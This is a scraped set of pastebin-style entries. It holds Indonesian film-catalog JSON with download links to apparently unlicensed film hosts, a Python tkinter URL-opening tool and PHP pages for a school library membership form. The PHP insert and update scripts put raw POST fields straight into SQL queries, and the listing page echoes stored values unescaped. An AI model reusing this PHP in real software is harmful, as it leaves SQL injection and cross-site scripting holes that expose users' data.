         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2017/11/film-war-planet-apes-2017.jpg"",
      ""videoId"": ""yDBFrQvfGlQ"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/uidf6lio110q_n"",
      ""title"": ""WAR FOR THE PLANET OF THE APES (2017)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2017 | Action | Adventure | Drama | Sci-fi | Thriller"",
      ""synopsis"": ""War for the Planet of the Apes (2017) Caesar dan kera-keranya dipaksa terlibat dalam konflik mematikan dengan pasukan manusia yang dipimpin oleh seorang Kolonel yang kejam. Setelah para kera menderita kerugian yang tak terbayangkan, Caesar bergulat dengan naluri gelapnya dan memulai misi mistisnya sendiri untuk membalaskan dendam kaumnya. Saat perjalanan akhirnya mempertemukan mereka, Caesar dan Kolonel diadu satu sama lain dalam pertempuran epik yang akan menentukan nasib spesies mereka dan masa depan planet ini. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2024/05/film-vash-2023-lk21-d21.jpg"",
      ""videoId"": ""DuWOpHkG49s"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/n5uon6y8zro7_h"",
      ""title"": ""VASH (2023)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2023 | Horror | Mystery | Thriller"",
      ""synopsis"": ""Vash (2023) Atharva, seorang pria keluarga, membawa keluarganya untuk berlibur dan sayangnya terjebak dalam ilmu hitam oleh orang asing bernama Pratap."",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s3.lk21static.xyz/wp-content/uploads/2016/01/film-dawn-of-the-planet-of-the-apes-2014.jpg"",
      ""videoId"": ""3sHMCRaS3ao"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/zc1q7o0iqe5f_n"",
      ""title"": ""DAWN OF THE PLANET OF THE APES (2014)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2014 | Action | Drama | Sci-fi"",
      ""synopsis"": ""Dawn of the Planet of the Apes (2014) Bercerita tentang negara kera yang berkembang secara genetik yang dipimpin oleh Caesar, terancam oleh sekelompok manusia yang selamat dari virus mematikan yang dilepaskan satu dekade sebelumnya. Mereka mencapai perdamaian yang rapuh, namun hal itu tidak bertahan lama, karena kedua belah pihak berada di ambang perang yang akan menentukan siapa yang akan muncul sebagai spesies dominan di Bumi. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/g719s9wq1fu0_n"",
      ""title"": ""Deadpool 2"",
      ""inform"": ""18+"",
      ""hashtag"": ""2016 | Drama | Romance"",
      ""synopsis"": ""Deadpool (2016) Ini adalah kisah asal usul mantan anggota Pasukan Khusus yang berubah menjadi tentara bayaran Wade Wilson, yang setelah menjadi sasaran eksperimen jahat yang membuatnya memiliki kekuatan penyembuhan yang dipercepat, mengadopsi alter ego Deadpool. Berbekal kemampuan barunya dan selera humor yang kelam, Deadpool memburu pria yang hampir menghancurkan hidupnya. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2010 | Action | Comedy | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    }
  ]
}"
2YhzZ5yc,Film (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:07:33 AM CDT,"{
  ""films"": [
    {
      ""imgUrl"": ""https://s4.lk21static.xyz/wp-content/uploads/2024/04/film-kung-fu-panda-4-2024-lk21-d21.jpg"",
      ""videoId"": ""_inKs4eeHiI"",
      ""urlDownload"": ""https://filemoon.sx/download/v02sxuswgcid"",
      ""title"": ""KUNG FU PANDA 4 (2024)"",
      ""hashtag"": ""2024 | Action | Adventure | Animation | 10+"",
      ""synopsis"": ""Kung Fu Panda 4 (2024) Setelah Po disadap untuk menjadi Pemimpin Spiritual Lembah Damai, dia perlu menemukan dan melatih Prajurit Naga baru, sementara penyihir jahat berencana untuk memanggil kembali semua penjahat utama yang telah dikalahkan Po ke alam roh.""
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2017/11/film-war-planet-apes-2017.jpg"",
      ""videoId"": ""yDBFrQvfGlQ"",
      ""urlDownload"": ""https://filelions.site/download/uidf6lio110q_n"",
      ""title"": ""WAR FOR THE PLANET OF THE APES (2017)"",
      ""hashtag"": ""2017 | Action | Adventure | Drama | Sci-fi | Thriller | 18+"",
      ""synopsis"": ""War for the Planet of the Apes (2017) Caesar dan kera-keranya dipaksa terlibat dalam konflik mematikan dengan pasukan manusia yang dipimpin oleh seorang Kolonel yang kejam. Setelah para kera menderita kerugian yang tak terbayangkan, Caesar bergulat dengan naluri gelapnya dan memulai misi mistisnya sendiri untuk membalaskan dendam kaumnya. Saat perjalanan akhirnya mempertemukan mereka, Caesar dan Kolonel diadu satu sama lain dalam pertempuran epik yang akan menentukan nasib spesies mereka dan masa depan planet ini. ??""
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2024/05/film-vash-2023-lk21-d21.jpg"",
      ""videoId"": ""DuWOpHkG49s"",
      ""urlDownload"": ""https://filelions.site/download/n5uon6y8zro7_h"",
      ""title"": ""VASH (2023)"",
      ""hashtag"": ""2023 | Horror | Mystery | Thriller | 18+"",
      ""synopsis"": ""Vash (2023) Atharva, seorang pria keluarga, membawa keluarganya untuk berlibur dan sayangnya terjebak dalam ilmu hitam oleh orang asing bernama Pratap.""
    },
    {
      ""imgUrl"": ""https://s3.lk21static.xyz/wp-content/uploads/2016/01/film-dawn-of-the-planet-of-the-apes-2014.jpg"",
      ""videoId"": ""3sHMCRaS3ao"",
      ""urlDownload"": ""https://filelions.site/download/zc1q7o0iqe5f_n"",
      ""title"": ""DAWN OF THE PLANET OF THE APES (2014)"",
      ""hashtag"": ""2014 | Action | Drama | Sci-fi | 18+"",
      ""synopsis"": ""Dawn of the Planet of the Apes (2014) Bercerita tentang negara kera yang berkembang secara genetik yang dipimpin oleh Caesar, terancam oleh sekelompok manusia yang selamat dari virus mematikan yang dilepaskan satu dekade sebelumnya. Mereka mencapai perdamaian yang rapuh, namun hal itu tidak bertahan lama, karena kedua belah pihak berada di ambang perang yang akan menentukan siapa yang akan muncul sebagai spesies dominan di Bumi. ??""
    },
    {
      ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""urlDownload"": ""https://filelions.site/download/g719s9wq1fu0_n"",
      ""title"": ""Deadpool 2"",
      ""hashtag"": ""2016 | Drama | Romance | 18+"",
      ""synopsis"": ""Deadpool (2016) Ini adalah kisah asal usul mantan anggota Pasukan Khusus yang berubah menjadi tentara bayaran Wade Wilson, yang setelah menjadi sasaran eksperimen jahat yang membuatnya memiliki kekuatan penyembuhan yang dipercepat, mengadopsi alter ego Deadpool. Berbekal kemampuan barunya dan selera humor yang kelam, Deadpool memburu pria yang hampir menghancurkan hidupnya. ??""
    }
  ]
}"
m6fpwQ3E,Abre Url´s (Automatização de cópia no 1fichier),MizunoBrasil,Python,Wednesday 15th of May 2024 11:49:40 PM CDT,"# Automatização de cópia de arquivos no 1fichier. O Programa simplesmente abre as url´s inseridas na caixa de texto.

import webbrowser
import threading
import time
import tkinter as tk
from tkinter import scrolledtext, messagebox, Menu

def open_urls():
    urls = text_area.get('1.0', tk.END).strip().split('\n')
    if not urls:
        messagebox.showinfo(""Erro"", ""Por favor, insira pelo menos uma URL."")
        return
    
    def open_urls_in_sequence():
        for url in urls:
            if url:
                webbrowser.open_new_tab(url)
                time.sleep(1)  # Pausa de 1 segundo entre aberturas de abas

    threading.Thread(target=open_urls_in_sequence).start()

def on_right_click(event):
    try:
        # Exibe o menu de contexto na posição do mouse
        context_menu.tk_popup(event.x_root, event.y_root)
    finally:
        # Garante que o menu seja fechado
        context_menu.grab_release()

def paste_action():
    # Função para colar texto na área de texto
    text_area.event_generate(""<<Paste>>"")

def main():
    global text_area, context_menu
    root = tk.Tk()
    root.title(""Abrir URLs - Automação de arquivos do 1fichier"")

    # Configuração da janela maior e mais vertical
    window_width = 500
    window_height = 500
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x_coordinate = int((screen_width / 2) - (window_width / 2))
    y_coordinate = int((screen_height / 2) - (window_height / 2))
    root.geometry(f""{window_width}x{window_height}+{x_coordinate}+{y_coordinate}"")

    # Área de texto maior e mais vertical para inserção de URLs
    text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=20)
    text_area.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
    text_area.bind(""<Button-3>"", on_right_click)

    # Menu de contexto para colar
    context_menu = Menu(root, tearoff=0)
    context_menu.add_command(label=""Colar"", command=paste_action)

    # Botão para abrir URLs
    button_open = tk.Button(root, text=""Abrir URLs"", command=open_urls)
    button_open.pack(pady=20)

    root.mainloop()

if __name__ == ""__main__"":
    main()
"
s2mP8buF,proses-tambah-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:05:54 PM CDT,"<?php

include(""config.php"");

// cek apakah tombol daftar sudah diklik atau blum?
if(isset($_POST['daftar'])){
	
	// ambil data dari formulir
	$nama = $_POST['nama'];
	$alamat = $_POST['alamat'];
	$jk = $_POST['jenis_kelamin'];
	$agama = $_POST['agama'];
	$sekolah = $_POST['asal_sekolah'];
	
	// buat query
	$sql = ""INSERT INTO anggota_perpus (nama, alamat, jenis_kelamin, agama, asal_sekolah) VALUE ('$nama', '$alamat', '$jk', '$agama', '$sekolah')"";
	$query = mysqli_query($db, $sql);
	
	// apakah query simpan berhasil?
	if( $query ) {
		// kalau berhasil alihkan ke halaman index.php dengan status=sukses
		header('Location: index.php?status=sukses');
	} else {
		// kalau gagal alihkan ke halaman indek.php dengan status=gagal
		header('Location: index.php?status=gagal');
	}
	
	
} else {
	die(""Akses dilarang..."");
}

?>"
XPytXGsE,proses-edit-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:05:19 PM CDT,"<?php

	include(""config.php"");

	// cek apakah tombol sudah diklik atau blum?
	if(isset($_POST['simpan'])){
		
		// ambil data dari formulir
		$id = $_POST['id_anggota'];
		$nama = $_POST['nama'];
		$alamat = $_POST['alamat'];
		$jk = $_POST['jenis_kelamin'];
		$agama = $_POST['agama'];
		$sekolah = $_POST['asal_sekolah'];
		
		// buat query update
		$sql = ""UPDATE anggota_perpus SET nama='$nama', alamat='$alamat', jenis_kelamin='$jk', agama='$agama', asal_sekolah='$sekolah' WHERE id_anggota=$id"";
		$query = mysqli_query($db, $sql);
		
		// apakah query update berhasil?
		if( $query ) {
			// kalau berhasil alihkan ke halaman list-daftar-anggota.php
			header('Location: list-daftar-anggota.php');
		} else {
			// kalau gagal tampilkan pesan
			die(""Gagal menyimpan perubahan..."");
		}
		
		
	} else {
		die(""Akses dilarang..."");
	}

?>"
x7dcXRdM,list-daftar-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:04:33 PM CDT,"<?php include(""config.php""); ?>


<!DOCTYPE html>
<html>
<head>
	<title>Pendaftaran Anggota Perpus Baru | SMK Gamelab Indonesia</title>
	<style>
		.anggota {
		  font-family: Arial, Helvetica, sans-serif;
		  border-collapse: collapse;
		  width: 100%;
		}

		.anggota td, .anggota th {
		  border: 1px solid #ddd;
		  padding: 8px;
		}

		.anggota td {
		  padding-top: 12px;
		  padding-bottom: 12px;
		  text-align: center;
		}

		.anggota tr:nth-child(even){background-color: #f2f2f2;}

		.anggota tr:hover {background-color: #ddd;}

		.anggota th {
		  padding-top: 12px;
		  padding-bottom: 12px;
		  text-align: center;
		  background-color: #04AA6D;
		  color: white;
		}
		.fcc-btn1 {
		  background-color:#008CBA;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}
		.fcc-btn2 {
		  background-color: #f44336;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}

		.fcc-btn3 {
		  background-color: #4CAF50;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}
		a {
			text-decoration:none;
		}
	</style>
</head>

<body>
	<header>
		<h1>Daftar Anggota Perpustakaan yang sudah mendaftar</h1>
	</header>
	
	<nav>
		<a class='fcc-btn3' href=""form-daftar-anggota.php"">[+] Tambah Anggota</a>
	</nav>
	
	<br>
	
	<table border=""1"" class=""anggota"">
		<thead>
			<tr>
				<th>No</th>
				<th>Nama Lengkap</th>
				<th>Alamat Lengkap</th>
				<th>Jenis Kelamin</th>
				<th>Agama</th>
				<th>Asal Sekolah</th>
				<th>Tindakan</th>
			</tr>
		</thead>
		<tbody>
			
			<?php
				$sql = ""SELECT * FROM anggota_perpus"";
				$query = mysqli_query($db, $sql);
				
				while($anggota = mysqli_fetch_array($query)){
					echo ""<tr>"";
							
					echo ""<td>"".$anggota['id_anggota'].""</td>"";
					echo ""<td>"".$anggota['nama'].""</td>"";
					echo ""<td>"".$anggota['alamat'].""</td>"";
					echo ""<td>"".$anggota['jenis_kelamin'].""</td>"";
					echo ""<td>"".$anggota['agama'].""</td>"";
					echo ""<td>"".$anggota['asal_sekolah'].""</td>"";
							
					echo ""<td>"";
					echo ""<a class='fcc-btn1' href='form-edit-anggota.php?id_anggota="".$anggota['id_anggota'].""' >Edit</a>    "";
				        // tambahkan kode pada baris <a class='fcc-btn2' >Hapus</a>
					echo ""<a class='fcc-btn2' href='hapus-anggota.php?id_anggota="".$anggota['id_anggota'].""' >Hapus</a>"";
					echo ""</td>"";
							
					echo ""</tr>"";
				}	
			?>
			
		</tbody>
	</table>
	
	<h3>Total: <?php echo mysqli_num_rows($query) ?> Anggota baru</h3>
	
	</body>
</html>"
ggr3TEiX,index.php,ali602,PHP,Wednesday 15th of May 2024 09:03:53 PM CDT,"<!DOCTYPE html>
<html>
<head>
	<title>Pendaftaran Anggota Perpustakaan | SMK Gamelab Indonesia</title>
</head>

<body>
	<header>
		<h3>Pendaftaran Anggota Perpus Baru</h3>
		<h1>SMK Gamelab Indonesia</h1>
	</header>
	
	<h4>Menu</h4>
	<nav>
		<ul>
			<li><a href=""form-daftar-anggota.php"">Daftar Baru</a></li>
            <li><a href=""list-daftar-anggota.php"">List Anggota Perpus</a></li>
		</ul>
	</nav>
	
	
	<?php if(isset($_GET['status'])): ?>
	<p>
		<?php
			if($_GET['status'] == 'sukses'){
				echo ""<div style='border: 1px solid rgb(214,233,198);
                background-color: rgb(223,240,216);color: rgb(70,136,71);'>Pendaftaran anggota baru berhasil!</div>"";
			} else {
				echo ""<div style='border: 1px solid rgb(238,211,215);
                background-color: rgb(242,222,222);color: rgb(185,74,72);'>Pendaftaran gagal!</div>"";
			}
		?>
	</p>
	<?php endif; ?>
	
	</body>
</html>"
